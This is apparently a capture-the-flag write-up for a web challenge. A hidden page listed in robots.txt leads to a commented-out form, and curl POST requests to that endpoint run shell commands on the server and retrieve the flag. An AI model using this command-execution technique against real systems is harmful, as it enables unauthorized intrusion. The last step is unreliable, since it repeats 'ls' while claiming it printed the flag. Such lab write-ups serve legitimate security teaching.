Web Security

Prompt - "Sometimes websites are afraid of the terminator finding things out. http://challenge.acictf.com:48390 The flag is in flag.txt."

Upon going to the website we're greeted with a big picture of a robot, and in the prompt it says "terminator". Let's check /robots.txt

we get the following
```
User-agent: *
Allow: /index.html
Allow: /products.html
Disallow: /maintenance_foo_bar_deadbeef_12345.html
```

Going to the /maintenance page we don't see very much other than this strange header 
```
Human-Built Robots LLC.
Maintenance
Result: Run a command!
```

In the source code however we do see this 
```
 <!--
            Disabled for being insecure... oops!
        <form action="/secret_maintenance_foo_543212345", method="POST">
            <input name="cmd"/>
        </form>-->
```

This means there's a API for us to post to. Let's see if we can make a post request with a command
`curl -d "cmd=ls" http://challenge.acictf.com:48390/secret_maintenance_foo_543212345`

we get a response with the following list built into the HTML, so we know it works
```
Result: flag.txt
robots.txt
server.py
static
templates
xinet_startup.sh
```

now we just need to get the flag.txt
`curl -d "cmd=ls" http://challenge.acictf.com:48390/secret_maintenance_foo_543212345`

and we get the flag

ACI{a0457c209e2ea4e00f731dc5ae4}

